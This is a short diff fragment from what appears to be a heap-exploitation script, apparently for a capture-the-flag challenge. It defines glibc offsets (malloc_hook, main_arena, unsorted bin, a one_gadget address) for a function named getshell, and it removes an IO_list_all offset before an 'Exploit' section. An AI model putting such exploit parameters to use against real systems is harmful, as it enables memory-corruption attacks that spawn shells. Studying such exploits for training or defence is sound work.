@@ -143,7 +143,6 @@ def getshell():
 malloc_hook_offset = 0x3c3b10
 main_arena_offset = 0x3c3b20
 unsorted_bin_offset = main_arena_offset+0x58
-IO_list_all_offset = 0x3c4520
 one_gadget = 0xf0567
 
 ###Exploit
